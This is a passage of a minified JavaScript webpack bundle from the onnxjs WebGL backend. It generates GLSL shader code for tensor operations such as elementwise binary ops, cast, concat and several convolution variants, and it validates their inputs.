}\n  ",name:"and_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslOr(){return{body:"\n  float or_(float a, float b) {\n    return float( bool(a) || bool(b) );\n  }\n  vec4 or_(vec4 v1, vec4 v2) {\n    bvec4 b1 = bvec4(v1);\n    bvec4 b2 = bvec4(v2);\n    return vec4( b1.r || b2.r ,\n                b1.g || b2.g,\n                b1.b || b2.b,\n                b1.a || b2.a );\n  }\n  ",name:"or_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslXor(){return{body:"\n  float xor_(float a, float b) {\n    return float( bool(a) ^^ bool(b) );\n  }\n  vec4 xor_(vec4 v1, vec4 v2) {\n    bvec4 b1 = bvec4(v1);\n    bvec4 b2 = bvec4(v2);\n    return vec4( b1.r ^^ b2.r ,\n                b1.g ^^ b2.g,\n                b1.b ^^ b2.b,\n                b1.a ^^ b2.a );\n  }\n  ",name:"xor_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslPow(){return function glslBuiltinBinary(fname){const name=`${fname}_`;return{body:`\n  float ${name}(float a, float b) {\n    return ${fname}(a, b);\n  }\n  vec4 ${name}(vec4 v1, vec4 v2) {\n    return ${fname}(v1, v2);\n  }\n  `,name:name,type:glsl_definitions_1.FunctionType.ValueBased}}("pow")}function glslPRelu(){return{body:"\n  float prelu_(float a, float b) {\n    return a < 0.0 ? a * b: a;\n  }\n  vec4 prelu_(vec4 v1, vec4 v2) {\n    return vec4(\n      v1.r < 0.0 ? v1.r * v2.r: v1.r,\n      v1.g < 0.0 ? v1.g * v2.g: v1.g,\n      v1.b < 0.0 ? v1.b * v2.b: v1.b,\n      v1.a < 0.0 ? v1.a * v2.a: v1.a\n      );\n  }\n  ",name:"prelu_",type:glsl_definitions_1.FunctionType.ValueBased}}exports.glslAdd=glslAdd,exports.glslDiv=glslDiv,exports.glslMul=glslMul,exports.glslSub=glslSub,exports.glslEqual=glslEqual,exports.glslGreater=glslGreater,exports.glslLess=glslLess,exports.glslAnd=glslAnd,exports.glslOr=glslOr,exports.glslXor=glslXor,exports.glslPow=glslPow,exports.glslPRelu=glslPRelu;const createBinaryProgramInfoLoader=(handler,inputs,glslFunc,outputTensorType=inputs[0].type,cacheKey)=>{const textureType=handler.session.pack?types_1.TextureType.packed:types_1.TextureType.unpacked;return{name:glslFunc.name,inputNames:["A","B"],inputTypes:[textureType,textureType],cacheHint:cacheKey,get:()=>createBinaryProgramInfo(handler,inputs,glslFunc,outputTensorType)}},createBinaryProgramInfo=(handler,inputs,glslFunc,outputTensorType=inputs[0].type)=>{const textureType=handler.session.pack?types_1.TextureType.packed:types_1.TextureType.unpacked,isBroadcast=!util_1.ShapeUtil.areEqual(inputs[0].dims,inputs[1].dims);let outputShape=inputs[0].dims;const usePackedTexture=handler.session.pack;if(isBroadcast){const calculatedShape=util_1.BroadcastUtil.calcShape(inputs[0].dims,inputs[1].dims,!1);if(!calculatedShape)throw new Error("Can't perform binary op on the given tensors");outputShape=calculatedShape;const outputRank=outputShape.length,aRank=0!==inputs[0].dims.length?inputs[0].dims.length:1,bRank=0!==inputs[1].dims.length?inputs[1].dims.length:1,aBcast=0!==inputs[0].dims.length?"bcastIndices_A(indices, aindices);":"aindices[0] = 0;",bBcast=0!==inputs[1].dims.length?"bcastIndices_B(indices, bindices);":"bindices[0] = 0;",glsl=(0,glsl_source_1.getGlsl)(handler.session.backend.glContext.version),shaderSource=usePackedTexture?`\n      ${glslFunc.body}\n      void main() {\n        vec4 a = getAAtOutCoords();\n        vec4 b = getBAtOutCoords();\n        vec4 result = ${glslFunc.name}(a, b);\n        ${glsl.output} = result;\n      }`:`\n      ${glslFunc.body}\n      float process(int indices[${outputRank}]) {\n        int aindices[${aRank}];\n        int bindices[${bRank}];\n        ${aBcast}\n        ${bBcast}\n        return ${glslFunc.name}(_A(aindices), _B(bindices));\n      }`;return{name:glslFunc.name,inputNames:["A","B"],inputTypes:[textureType,textureType],output:{dims:outputShape,type:outputTensorType,textureType:textureType},shaderSource:shaderSource,hasMain:usePackedTexture}}const glsl=(0,glsl_source_1.getGlsl)(handler.session.backend.glContext.version),shaderSource=`\n    ${glslFunc.body}\n    void main() {\n      vec4 v1 = ${glsl.texture2D}(A, TexCoords);\n      vec4 v2 = ${glsl.texture2D}(B, TexCoords);\n      vec4 result = ${glslFunc.name}(v1, v2);\n      ${glsl.output} = result;\n    }\n    `;return{name:glslFunc.name,inputNames:["A","B"],inputTypes:[textureType,textureType],output:{dims:inputs[0].dims,type:outputTensorType,textureType:textureType},shaderSource:shaderSource,hasMain:!0}};exports.add=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslAdd()),inputs)];exports.and=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslAnd(),"bool"),inputs)];exports.div=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslDiv()),inputs)];exports.equal=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslEqual(),"bool"),inputs)];exports.greater=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslGreater(),"bool"),inputs)];exports.less=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslLess(),"bool"),inputs)];exports.mul=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslMul()),inputs)];exports.or=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslOr(),"bool"),inputs)];exports.pow=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslPow()),inputs)];exports.pRelu=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslPRelu()),inputs)];exports.sub=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslSub()),inputs)];exports.xor=(handler,inputs)=>[handler.run(createBinaryProgramInfoLoader(handler,inputs,glslXor(),"bool"),inputs)]},"./lib/onnxjs/backends/webgl/ops/cast.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseCastAttributes=exports.cast=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts");exports.cast=(handler,inputs,to)=>(validateInputs(inputs),[handler.cast(inputs[0],to)]);exports.parseCastAttributes=node=>util_1.ProtoUtil.tensorDataTypeFromProto(node.attributes.getInt("to"));const validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Cast requires 1 input.");if("string"===inputs[0].type)throw new Error("Invalid input type.")}},"./lib/onnxjs/backends/webgl/ops/concat-packed.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createPackedConcatProgramInfoLoader=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts"),packing_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/packing-utils.ts");exports.createPackedConcatProgramInfoLoader=(handler,inputs,attributes)=>{const metadata=(inputCount=inputs.length,cacheHint=attributes.cacheKey,{name:"Concat (packed)",inputNames:Array.from({length:inputCount},((v,i)=>`X${i}`)),inputTypes:Array(inputCount).fill(types_1.TextureType.packed),cacheHint:cacheHint});var inputCount,cacheHint;return Object.assign(Object.assign({},metadata),{get:()=>((handler,metadata,inputs,axis)=>{const inputShape=inputs[0].dims.slice();if(axis>=inputShape.length||axis<-1*inputShape.length)throw new Error("axis specified for concat doesn't match input dimensionality");axis<0&&(axis=inputShape.length+axis);const outputShape=inputShape.slice(0);for(let i=1;i<inputs.length;i++){const dataNShape=inputs[i].dims.slice();for(let axisIndex=0;axisIndex<inputShape.length;axisIndex++)if(axisIndex===axis)outputShape[axis]+=dataNShape[axisIndex];else if(inputShape[axisIndex]!==dataNShape[axisIndex])throw new Error("non concat dimensions must match")}const rank=outputShape.length,coords=(0,packing_utils_1.getChannels)("coords",rank),dtype=(0,utils_1.getCoordsDataType)(rank),unpackChannel=(0,packing_utils_1.unpackFromChannel)(),shapes=inputs.map((i=>i.dims)),channels=(0,utils_1.getGlChannels)(rank),offsets=new Array(shapes.length-1);offsets[0]=shapes[0][axis];for(let i=1;i<offsets.length;i++)offsets[i]=offsets[i-1]+shapes[i][axis];const channel=channels[axis],lastChannels=channels.slice(-2),allChannels=channels.join();let getValueSnippet=`if (${channel} < ${offsets[0]}) {\n        return getChannel(\n            getX0(${allChannels}), vec2(${lastChannels.join()}));\n        }`;for(let i=1;i<offsets.length;i++){const shift=offsets[i-1];getValueSnippet+=`\n            if (${channel} < ${offsets[i]}  && ${channel} >= ${offsets[i-1]}) {\n              return getChannel(\n                getX${i}(${getShiftedChannelsSnippet(channels,channel,shift)}),\n                vec2(${getShiftedChannelsSnippet(lastChannels,channel,shift)}));\n            }`}const lastIndex=offsets.length,shift=offsets[offsets.length-1];getValueSnippet+=`\n            return getChannel(\n              getX${lastIndex}(${getShiftedChannelsSnippet(channels,channel,shift)}),\n              vec2(${getShiftedChannelsSnippet(lastChannels,channel,shift)}));`;const glsl=(0,glsl_source_1.getGlsl)(handler.session.backend.glContext.version),shaderSource=`\n          ${unpackChannel}\n          float getValue(${channels.map((x=>"int "+x))}) {\n            ${getValueSnippet}\n          }\n\n          void main() {\n            ${dtype} coords = getOutputCoords();\n            int lastDim = coords.${channels[rank-1]};\n            coords.${channels[rank-1]} = coords.${channels[rank-2]};\n            coords.${channels[rank-2]} = lastDim;\n\n            vec4 result = vec4(getValue(${coords}), 0., 0., 0.);\n\n            ${coords[rank-1]} = ${coords[rank-1]} + 1;\n            if (${coords[rank-1]} < ${outputShape[rank-1]}) {\n              result.g = getValue(${coords});\n            }\n\n            ${coords[rank-2]} = ${coords[rank-2]} + 1;\n            if (${coords[rank-2]} < ${outputShape[rank-2]}) {\n              result.a = getValue(${coords});\n            }\n\n            ${coords[rank-1]} = ${coords[rank-1]} - 1;\n            if (${coords[rank-2]} < ${outputShape[rank-2]} &&\n                ${coords[rank-1]} < ${outputShape[rank-1]}) {\n              result.b = getValue(${coords});\n            }\n            ${glsl.output} = result;\n          }\n        `;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.packed},shaderSource:shaderSource,hasMain:!0})})(handler,metadata,inputs,attributes.axis)})};const getShiftedChannelsSnippet=(channels,channel,shift)=>{const channelIdx=channels.indexOf(channel);return channels.map(((c,idx)=>idx===channelIdx?`${c} - ${shift}`:c)).join()}},"./lib/onnxjs/backends/webgl/ops/concat.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseConcatAttributes=exports.concat=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),concat_packed_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/concat-packed.ts");exports.concat=(inferenceHandler,inputs,attributes)=>{if(validateInputs(inputs),inferenceHandler.session.pack&&inputs[0].dims.length>1){return[inferenceHandler.run((0,concat_packed_1.createPackedConcatProgramInfoLoader)(inferenceHandler,inputs,attributes),inputs)]}return[inferenceHandler.run(createUnpackedConcatProgramInfoLoader(inferenceHandler,inputs,attributes),inputs)]};const createUnpackedConcatProgramInfoLoader=(handler,inputs,attributes)=>{const metadata=(inputCount=inputs.length,cacheHint=attributes.cacheKey,{name:"Concat",inputNames:Array.from({length:inputCount},((v,i)=>`X${i}`)),inputTypes:Array(inputCount).fill(types_1.TextureType.unpacked),cacheHint:cacheHint});var inputCount,cacheHint;return Object.assign(Object.assign({},metadata),{get:()=>((handler,metadata,inputs,axis)=>{const inputShape=inputs[0].dims.slice();if(axis>=inputShape.length||axis<-1*inputShape.length)throw new Error("axis specified for concat doesn't match input dimensionality");axis<0&&(axis=inputShape.length+axis);const outputShape=inputShape.slice(0);for(let i=1;i<inputs.length;i++){const dataNShape=inputs[i].dims.slice();for(let axisIndex=0;axisIndex<inputShape.length;axisIndex++)if(axisIndex===axis)outputShape[axis]+=dataNShape[axisIndex];else if(inputShape[axisIndex]!==dataNShape[axisIndex])throw new Error("non concat dimensions must match")}const rank=outputShape.length,sizeInConcatAxis=new Array(inputs.length);let previousSum=0;for(let i=0;i<sizeInConcatAxis.length;++i)previousSum+=inputs[i].dims[axis],sizeInConcatAxis[i]=previousSum;let getTextureIndexWhereDataResidesMethod="";getTextureIndexWhereDataResidesMethod=inputs.length<5?getTextureIndexWhereDataResidesLinearSearch(sizeInConcatAxis):getTextureIndexWhereDataResidesBinarySearch(sizeInConcatAxis);const shaderSource=`\n        ${getFetchDataFromCorrectTextureMethod(inputs.length,rank)}\n        ${getGetSizeInConcatAxisValueFromIndexMethod(sizeInConcatAxis)}\n        ${getTextureIndexWhereDataResidesMethod}\n        float process(int indices[${rank}]) {\n          int textureIndex = getTextureWhereDataResides (indices[${axis}]);\n\n          if(textureIndex != 0) {\n            indices[${axis}] = indices[${axis}] - int(getSizeInConcatAxisValueFromIndex(textureIndex-int(1)));\n          }\n\n          return fetchDataFromCorrectTexture(textureIndex, indices);\n        }`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})})(0,metadata,inputs,attributes.axis)})},getTextureIndexWhereDataResidesLinearSearch=sizeInConcatAxis=>`int getTextureWhereDataResides(int index) {\n      ${sizeInConcatAxis.map(((size,i)=>`if(index<${size}) {return ${i};}\n`)).join("")}\n    }`,getTextureIndexWhereDataResidesBinarySearch=sizeInConcatAxis=>getTextureIndexWhereDataResidesLinearSearch(sizeInConcatAxis),getFetchDataFromCorrectTextureMethod=(numberOfTensors,tensorRank)=>{const codeLines=[`float fetchDataFromCorrectTexture(int textureIndex, int indices[${tensorRank}]) {`];for(let i=0;i<numberOfTensors;++i)0===i?codeLines.push(`\tif (textureIndex == ${i}) { return _X${i}(indices); }`):i===numberOfTensors-1?codeLines.push(`\telse { return _X${i}(indices); }`):codeLines.push(`\telse if (textureIndex == ${i}) { return _X${i}(indices); }`);return codeLines.push("\t}"),codeLines.join("\n")},getGetSizeInConcatAxisValueFromIndexMethod=sizeInConcatAxis=>{const codeLines=["int getSizeInConcatAxisValueFromIndex(int index) {"];for(let i=0;i<sizeInConcatAxis.length;++i)0===i?codeLines.push(`\tif (index == ${i}) { return ${sizeInConcatAxis[i]}; }`):i===sizeInConcatAxis.length-1?codeLines.push(`\telse { return ${sizeInConcatAxis[i]}; }`):codeLines.push(`\telse if (index == ${i}) { return ${sizeInConcatAxis[i]}; }`);return codeLines.push("\t}"),codeLines.join("\n")};exports.parseConcatAttributes=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({axis:node.attributes.getInt("axis")});const validateInputs=inputs=>{if(!inputs||inputs.length<1)throw new Error("too few inputs");const inputType=inputs[0].type,inputDimensionality=inputs[0].dims.length;if("string"===inputType)throw new Error("string tensor is not supported yet");for(const input of inputs){if(input.type!==inputType)throw new Error("input tensors should be one type");if(input.dims.length!==inputDimensionality)throw new Error("input tensors should have the same shape")}}},"./lib/onnxjs/backends/webgl/ops/conv-grouped.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createUnpackedGroupedConvProgramInfoLoader=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),conv_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/conv.ts"),fuse_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/fuse-utils.ts");exports.createUnpackedGroupedConvProgramInfoLoader=(inferenceHandler,inputs,attributes)=>{const metadata=(hasBias=inputs.length>2,cacheHint=attributes.cacheKey,{name:"GroupedConv",inputNames:hasBias?["X","W","Bias"]:["X","W"],inputTypes:hasBias?[types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked]:[types_1.TextureType.unpacked,types_1.TextureType.unpacked],cacheHint:cacheHint});var hasBias,cacheHint;return Object.assign(Object.assign({},metadata),{get:()=>((inferenceHandler,inputs,metadata,attributes)=>{const processBias=inputs.length>2?"value += getBias(output_channel);":"",xShape=inputs[0].dims.slice(),wShape=inputs[1].dims.slice(),outputChannelsPerGroup=wShape[0]/attributes.group;instrument_1.Logger.verbose("GroupedConv",`autpPad:${attributes.autoPad}, dilations:${attributes.dilations}, group:${attributes.group}, kernelShape:${attributes.kernelShape}, pads:${attributes.pads}, strides:${attributes.strides}`);const outputShape=(0,conv_1.calculateOutputShape)(xShape,wShape,attributes.dilations,attributes.pads,attributes.strides),glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),{activationFunction:activationFunction,applyActivation:applyActivation}=(0,fuse_utils_1.getActivationSnippet)(attributes),shaderSource=`\n  const ivec2 strides = ivec2(${attributes.strides[0]}, ${attributes.strides[1]});\n  const ivec2 pads = ivec2(${attributes.pads[0]}, ${attributes.pads[1]});\n  ${activationFunction}\n  void main() {\n    ivec4 coords = getOutputCoords();\n    int batch = coords.x;\n    int output_channel = coords.y;\n    ivec2 xRCCorner = coords.zw * strides - pads;\n    int group_id = output_channel / ${outputChannelsPerGroup};\n\n    float value = 0.0;\n    for (int wInChannel = 0; wInChannel < ${wShape[1]}; wInChannel++) {\n      int input_channel = group_id * ${wShape[1]} + wInChannel;\n      for (int wHeight = 0; wHeight < ${wShape[2]}; wHeight++) {\n        int xHeight = xRCCorner.x + wHeight * ${attributes.dilations[0]};\n\n        if (xHeight < 0 || xHeight >= ${xShape[2]}) {\n          continue;\n        }\n\n        for (int wWidth = 0; wWidth < ${wShape[3]}; wWidth++) {\n          int xWidth = xRCCorner.y + wWidth * ${attributes.dilations[1]};\n          if (xWidth < 0 || xWidth >= ${xShape[3]}) {\n            continue;\n          }\n\n          float xVal = getX(batch, input_channel, xWidth, xHeight);\n          float wVal = getW(output_channel, wInChannel, wWidth, wHeight);\n          value += xVal*wVal;\n        }\n      }\n    }\n    ${processBias}\n    ${applyActivation}\n    ${glsl.output} = vec4(value, .0, .0, .0);\n  }\n`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource,hasMain:!0})})(inferenceHandler,inputs,metadata,attributes)})}},"./lib/onnxjs/backends/webgl/ops/conv-pack.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.conv2DPacked=exports.conv2DPackedPointwise=void 0;const conv_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/conv.ts"),im2col_pack_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/im2col-pack.ts"),matmul_pack_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/matmul-pack.ts");exports.conv2DPackedPointwise=(inferenceHandler,inputs,attributes)=>{const xshape=inputs[0].dims,kshape=inputs[1].dims,outputShape=(0,conv_1.calculateOutputShape)(xshape,kshape,attributes.dilations,attributes.pads,attributes.strides),reshapedX=inferenceHandler.reshapePacked(inputs[0],[xshape[1],xshape[2]*xshape[3]]),reshapedK=inferenceHandler.reshapePacked(inputs[1],[kshape[0],kshape[1]]),matmulInputs=inputs.length>2?[reshapedK,reshapedX,inputs[2]]:[reshapedK,reshapedX],matmulOutput=inferenceHandler.run((0,matmul_pack_1.createPackedMatmulProgramInfoLoader)(inferenceHandler,matmulInputs,attributes),matmulInputs);return inferenceHandler.reshapePacked(matmulOutput,outputShape)};exports.conv2DPacked=(inferenceHandler,inputs,attributes)=>{const xshape=inputs[0].dims,kshape=inputs[1].dims,outputShape=(0,conv_1.calculateOutputShape)(xshape,kshape,attributes.dilations,attributes.pads,attributes.strides),im2colOutput=inferenceHandler.run((0,im2col_pack_1.createPackedIm2ColProgramInfoLoader)(inferenceHandler,inputs[0],inputs[1],outputShape,attributes),[inputs[0]]),kernelReshaped=inferenceHandler.reshapePacked(inputs[1],[kshape[0],kshape[1]*kshape[2]*kshape[3]]),matmulInputs=3===inputs.length?[kernelReshaped,im2colOutput,inputs[2]]:[kernelReshaped,im2colOutput],matmulOutput=inferenceHandler.run((0,matmul_pack_1.createPackedMatmulProgramInfoLoader)(inferenceHandler,matmulInputs,attributes),matmulInputs);return inferenceHandler.reshapePacked(matmulOutput,outputShape)}},"./lib/onnxjs/backends/webgl/ops/conv-transpose.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseConvTransposeAttributes=exports.convTranspose=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),fuse_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/fuse-utils.ts"),computeTotalPad=(inDim,stride,adj,kernel,dilation,outSize)=>(inDim-1)*stride+adj+(kernel-1)*dilation+1-outSize,distributePadding=(totalPad,autoPad,pads,head,tail)=>{const smallPad=Math.floor(totalPad/2);"SAME_UPPER"===autoPad?(pads[head]=smallPad,pads[tail]=totalPad-smallPad):"SAME_LOWER"===autoPad&&(pads[head]=totalPad-smallPad,pads[tail]=smallPad)};exports.convTranspose=(inferenceHandler,inputs,attributes)=>(validateInputs(inputs,attributes),convTranspose2d(inferenceHandler,inputs,attributes));const convTranspose2d=(inferenceHandler,inputs,attributes)=>{const adjustedAttributes=getAdjustedConvTransposeAttributes(attributes,inputs);return[convTranspose2DUnpacked(inferenceHandler,inputs,adjustedAttributes)]},createUnpackedConvTransposeProgramInfoLoader=(inferenceHandler,inputs,attributes)=>{const metadata=(hasBias=inputs.length>2,cacheHint=attributes.cacheKey,{name:"ConvTranspose",inputNames:hasBias?["X","W","B"]:["X","W"],inputTypes:hasBias?[types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked]:[types_1.TextureType.unpacked,types_1.TextureType.unpacked],cacheHint:cacheHint});var hasBias,cacheHint;return Object.assign(Object.assign({},metadata),{get:()=>((inferenceHandler,inputs,metadata,attributes)=>{const valueInit=inputs.length>2?"getB(output_channel)":"0.0",xShape=inputs[0].dims,wShape=inputs[1].dims,outputChannelsPerGroup=wShape[1],inputChannelsPerGroup=wShape[0]/attributes.group,outputShape=[inputs[0].dims[0],inputs[1].dims[1]*attributes.group,...attributes.outputShape],glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),{activationFunction:activationFunction,applyActivation:applyActivation}=(0,fuse_utils_1.getActivationSnippet)(attributes),shaderSource=`\n  const ivec2 strides = ivec2(${attributes.strides[0]}, ${attributes.strides[1]});\n  const ivec2 pads = ivec2(${attributes.pads[0]}, ${attributes.pads[1]});\n  ${activationFunction}\n  void main() {\n    ivec4 coords = getOutputCoords();\n    int batch = coords.x;\n    int output_channel = coords.y;\n\n    ivec2 loc = coords.zw + pads;\n\n    int group_id = output_channel / ${outputChannelsPerGroup};\n    int wOutChannel = output_channel - group_id * ${outputChannelsPerGroup};\n\n    float value = ${valueInit};\n    for (int inChannelOffset = 0; inChannelOffset < ${inputChannelsPerGroup}; inChannelOffset++) {\n      int input_channel = group_id * ${inputChannelsPerGroup} + inChannelOffset;\n      for (int wWOff = 0; wWOff < ${wShape[2]}; wWOff++) {\n        for (int wHOff = 0; wHOff < ${wShape[3]}; wHOff++) {\n          ivec2 wOff = ivec2(wWOff * ${attributes.dilations[0]}, wHOff * ${attributes.dilations[1]});\n          ivec2 wLoc = loc - wOff;\n          ivec2 wLocIn = wLoc / strides;\n          if (\n            wLocIn * strides == wLoc &&\n            wLocIn.x >= 0 && wLocIn.x < ${xShape[2]} &&\n            wLocIn.y >= 0 && wLocIn.y < ${xShape[3]}\n          ) {\n            float xVal = getX(batch, input_channel, wLocIn.y, wLocIn.x);\n            float wVal = getW(input_channel, wOutChannel, wHOff, wWOff);\n            value += xVal * wVal;\n          }\n        }\n      }\n    }\n    ${applyActivation}\n    ${glsl.output} = vec4(value, .0, .0, .0);\n  }\n`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource,hasMain:!0})})(inferenceHandler,inputs,metadata,attributes)})},convTranspose2DUnpacked=(inferenceHandler,inputs,attributes)=>inferenceHandler.run(createUnpackedConvTransposeProgramInfoLoader(inferenceHandler,inputs,attributes),inputs),getAdjustedConvTransposeAttributes=(attributes,inputs)=>{const kernelShape=attributes.kernelShape.slice();if(0===attributes.kernelShape.length)for(let i=2;i<inputs[1].dims.length;++i)kernelShape.push(inputs[1].dims[i]);const pads=attributes.pads.slice(),outputShape=attributes.outputShape.slice();((inputShape,kernelShape,dilations,autoPad,pads,strides,outputPadding,outputShape)=>{const spatialRank=inputShape.length-2,updateShape=0===outputShape.length;for(let i=0;i<spatialRank;++i){const outSize=updateShape?inputShape[i+2]*strides[i]:outputShape[i],totalPad=computeTotalPad(inputShape[i+2],strides[i],pads[i],kernelShape[i],dilations[i],outSize);distributePadding(totalPad,autoPad,pads,i,i+spatialRank),updateShape&&outputShape.push(strides[i]*(inputShape[i+2]-1)+outputPadding[i]+(kernelShape[i]-1)*dilations[i]+1-pads[i]-pads[i+spatialRank])}})(inputs[0].dims,kernelShape,attributes.dilations,attributes.autoPad,pads,attributes.strides,attributes.outputPadding,outputShape);const newAttributes=Object.assign({},attributes);return Object.assign(newAttributes,{kernelShape:kernelShape,pads:pads,outputShape:outputShape,cacheKey:attributes.cacheKey}),newAttributes};exports.parseConvTransposeAttributes=node=>{const attributes=node.attributes,activationAttributes=(0,fuse_utils_1.parseInternalActivationAttributes)(attributes),autoPad=attributes.getString("auto_pad","NOTSET"),dilations=attributes.getInts("dilations",[1,1]),group=attributes.getInt("group",1),kernelShape=attributes.getInts("kernel_shape",[]),outputPadding=attributes.getInts("output_padding",[0,0]),outputShape=attributes.getInts("output_shape",[]),pads=attributes.getInts("pads",[0,0,0,0]),strides=attributes.getInts("strides",[1,1]);return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)(Object.assign({autoPad:autoPad,dilations:dilations,group:group,kernelShape:kernelShape,outputPadding:outputPadding,outputShape:outputShape,pads:pads,strides:strides},activationAttributes))};const validateInputs=(inputs,attributes)=>{if(!inputs||2!==inputs.length&&3!==inputs.length)throw new Error("Conv requires 2 or 3 inputs");if(4!==inputs[0].dims.length||4!==inputs[1].dims.length)throw new Error("currently only support 2-dimensional conv");if(inputs[0].dims[1]!==inputs[1].dims[0])throw new Error("FILTER_IN_CHANNEL should be equal to DATA_CHANNEL");const featureMaps=inputs[1].dims[1]*attributes.group;if(3===inputs.length&&(1!==inputs[2].dims.length||inputs[2].dims[0]!==featureMaps))throw new Error("invalid bias");const spatialRank=inputs[0].dims.length-2;if(attributes.dilations.length!==spatialRank)throw new Error(`dilations should be ${spatialRank}D`);if(attributes.strides.length!==spatialRank)throw new Error(`strides should be ${spatialRank}D`);if(attributes.pads.length!==2*spatialRank)throw new Error(`pads should be ${2*spatialRank}D`);if(attributes.outputPadding.length!==spatialRank)throw new Error(`output_padding should be ${spatialRank}D`);if(0!==attributes.kernelShape.length&&attributes.kernelShape.length!==inputs[1].dims.length-2)throw new Error("invalid kernel shape");if(0!==attributes.outputShape.length&&attributes.outputShape.length!==inputs[0].dims.length-2)throw new Error("invalid output shape");if("float32"!==inputs[0].type||"float32"!==inputs[1].type)throw new Error("ConvTranspose input(X,W) should be float tensor");if(3===inputs.length&&"float32"!==inputs[2].type)throw new Error("ConvTranspose input(bias) should be float tensor")}},"./lib/onnxjs/backends/webgl/ops/conv.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseConvAttributes=exports.conv=exports.calculateOutputShape=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),conv_grouped_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/conv-grouped.ts"),conv_pack_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/conv-pack.ts"),dot_product_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/dot-product.ts"),fuse_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/fuse-utils.ts"),im2col_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/im2col.ts"),matmul_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/matmul.ts");exports.calculateOutputShape=(inputShape,kernelShape,dilations,adjustPads,strides)=>{const batchSize=inputShape[0],inputSpatialShape=inputShape.slice(2),spatialRank=inputSpatialShape.length,outChannels=kernelShape[0],dilatedKernelShape=kernelShape.slice(2).map(((v,i)=>v+(v-1)*(dilations[i]-1))),outputSpatialShape=inputSpatialShape.map(((v,i)=>v+adjustPads[i]+adjustPads[i+spatialRank])).map(((v,i)=>Math.floor((v-dilatedKernelShape[i]+strides[i])/strides[i])));return[batchSize,outChannels].concat(...outputSpatialShape)};exports.conv=(inferenceHandler,inputs,attributes)=>(validateInputs(inputs,attributes),conv2d(inferenceHandler,inputs,attributes));const conv2d=(inferenceHandler,inputs,attributes)=>{const 